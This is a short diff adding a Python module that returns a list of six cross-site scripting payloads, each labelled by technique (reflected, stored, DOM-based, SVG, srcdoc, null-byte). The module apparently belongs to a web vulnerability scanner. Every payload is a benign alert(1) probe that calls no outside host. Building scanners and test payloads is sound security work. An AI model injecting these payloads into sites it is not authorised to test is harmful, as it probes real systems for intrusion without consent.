@@ -1,0 +1,11 @@
+# modules/xss.py
+
+def get_xss_payloads():
+    return [
+        {"type": "Reflected", "payload": "<script>alert(1)</script>"},
+        {"type": "Stored", "payload": "<img src=x onerror=alert(1)>"},
+        {"type": "DOM-Based", "payload": "javascript:alert(1)"},
+        {"type": "SVG Bypass", "payload": "<svg/onload=alert(1)>"},
+        {"type": "Srcdoc", "payload": '<iframe srcdoc="<script>alert(1)</script>"></iframe>'},
+        {"type": "Null Byte", "payload": "<script%00>alert(1)</script>"}
+    ]
